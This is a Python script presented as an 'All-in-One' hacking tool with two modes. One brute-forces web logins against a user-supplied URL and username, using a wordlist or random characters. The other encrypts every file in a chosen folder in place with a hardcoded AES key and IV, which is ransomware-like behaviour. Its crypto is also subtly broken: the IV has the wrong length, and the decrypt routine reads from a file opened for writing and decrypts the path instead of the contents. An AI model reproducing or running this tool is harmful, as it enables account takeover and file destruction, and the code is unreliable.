class AllinOne:
    def HackTools(Elvo):

        print("Welcome to All-in-One-Elvo Tool")
        print('''
Choose Your Option From The List Below :)
    
    1.For Brute-Force enter Brute Force
    2.For AES encryption enter AES
 ''')
        User_Choice = input("And your choice would be?\n...: ").upper()
        print("You chose...: " , User_Choice.capitalize())


        # Test module!
        # if User_Choice == 'BRUTE FORCE':
        #     print("Nice")
        # elif User_Choice == 'AES':
        #     print("Nice")
        # else:
        #     print("Not an option :(")

        # -----------------------Brute Force-----------------------
        if User_Choice == 'BRUTE FORCE':
            import requests
            import random

            BruteIntro = print('''How would you like to Brute Force?

    1.With a Worldlist [1]
    2.With Random Numbers[2]
    3.With Your Own Characters[3]
''')
            BruteChoice = input(str("And your choice would be?\n...: "))
            print("You chose...: ", BruteChoice)

            if BruteChoice == "1":
                import requests

                url = input('Place the URL: ')
                username = input('Place the username: ')

                # chars =  "123"

                def send_request(username, passwd):
                    data = {
                        "username": username,
                        "password": passwd
                    }

                    r = requests.get(url, data=data)
                    return r

                def implist():
                    print('ADD .txt TO THE FILE!')
                    worldlist = input('Wordlist Path...: ')
                    file = open(worldlist, 'r')
                    tries = file.read().split('\n')
                    file.close()
                    return tries

                def main(tries):
                    for passwd in tries:
                        r = send_request(username, passwd)

                        if 'failed to login' in r.text.lower():
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password | {passwd} | !\n")
                            break

                tries = implist()
                main(tries)

            elif BruteChoice == "2":

                import requests
                import random

                url = input('Place the URL: ')
                username = input('Place the username: ')
                chars = "abcdefghijklmnopqrstuvwxyz0123456789"

                def send_request(username, passwd):
                    data = {
                        "username": username,
                        "password": passwd
                    }

                    r = requests.get(url, data=data)
                    return r

                def main():
                    while True:
                        rndpasswd = random.choices(chars, k=2)
                        # k= is the password length.
                        passwd = "".join(rndpasswd)
                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                        r = send_request(username, passwd)

                        if 'failed to login' in r.text.lower():
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password | {passwd} | !\n")
                            break

                main()

            elif BruteChoice == "3":
                import requests
                import random

                url = input('Place the URL: ')
                username = input('Place the username: ')
                chars = input('Write the characters to use')

                def send_request(username, passwd):
                    data = {
                        "username": username,
                        "password": passwd
                    }

                    r = requests.get(url, data=data)
                    return r

                def main():
                    while True:
                        rndpasswd = random.choices(chars, k=2)
                        # k= is the password length.
                        passwd = "".join(rndpasswd)
                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                        r = send_request(username, passwd)

                        if 'failed to login' in r.text.lower():
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password | {passwd} | !\n")
                            break

                main()

            else:
                print("That's not one of the options... start again\n")
                return object.HackTools(Elvo)
        # -----------------------Brute Force-----------------------


        # -----------------------AES-----------------------
        elif User_Choice == 'AES':
            AESQuestion = input("To Encrypt[1]\nTo Decrypt[2]\n...:")

            import hashlib
            import base64
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
            import os
            from Crypto.Random import get_random_bytes


            class AESCipher:
                def __init__(self, key):
                    self.key = b'12345678901234561234567890123456'
                    # self.key = hashlib.md5(key.encode('utf8')).digest() # - creates randon key

                def encrypt(self, data):
                    # iv = get_random_bytes(AES.block_size) - creates random iv
                    iv = b'12345678901234561234567890123456'
                    self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
                    return base64.b64encode(iv + self.cipher.encrypt(pad(data.encode('utf-8'),
                                                                         AES.block_size)))

                def decrypt(self, data):
                    self.key = b'12345678901234561234567890123456'
                    raw = base64.b64decode(data)
                    self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
                    return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)


            if AESQuestion == "1":


                # filepath =input('Place the Path to Encrypt...: ')
                folderpath = input('Place the Folder Path...: ')

                for file in os.listdir(folderpath):
                    fullpath = f'{folderpath}\{file}'


                    msg = open(fullpath, 'r').read()
                    base64encoding = base64.b64encode(str(msg).encode('ascii'))
                    SHA256encoding = hashlib.sha256(str(msg).encode('UTF-8')).hexdigest()
                    print(f'Base64...:{base64encoding}\nSHA256...: {SHA256encoding}')


                    print('AES...:', AESCipher('').encrypt(msg).decode('utf-8'))
                    print('next file')

                    with open(fullpath, 'w') as f:
                        f.write(AESCipher('').encrypt(msg).decode('utf-8'))

                         # Decrypt part

            elif AESQuestion == "2":

                Question = input("Are you sure? Yes/No...: ").capitalize()

                if Question == 'Yes':
                    folderpath = input('Place the Folder Path...: ')

                    for file in os.listdir(folderpath):
                        fullpath = f'{folderpath}\{file}'

                        msg = open(fullpath, 'r').read()

                        a = ''

                        print('AES...:', AESCipher(a).decrypt(msg).decode('utf-8'))
                        print('next file')

                        with open(fullpath, 'w') as f:
                            f.read()
                            f.write(AESCipher('').decrypt(fullpath).decode('utf-8'))

                    print('')

                    # folderpath = input(str(r'Place the Folder Path...: '))
                    #
                    # for file in os.listdir(folderpath):
                    #     fullpath = f'{folderpath},{file}'
                    #
                    #     # print('Place the file Path to Decrypt')
                    #     # filepath = input('Place the Path to Decrypt...: ')
                    #     # print('Place The AES Hash to Decrypt')
                    #     # decryptmsg = input('AES Hash...: ')
                    #     # print('Decrypted Has...:\n', AESCipher('').decrypt(decryptmsg).decode('utf-8'))

                        # with open(fullpath, 'w') as f:
                        #     f.read()
                        #     f.write(AESCipher('').decrypt(fullpath).decode('utf-8'))


                elif Question == 'No':
                    print('As you wish')

            else:
                print("That's not one of the options... start again\n")
                return object.HackTools(Elvo)


        # -----------------------AES-----------------------
        else:
            print("\nNot an option :( , Try again...\n")
            return object.HackTools(Elvo)


object = AllinOne
object.HackTools('12345678901234561234567890123456')
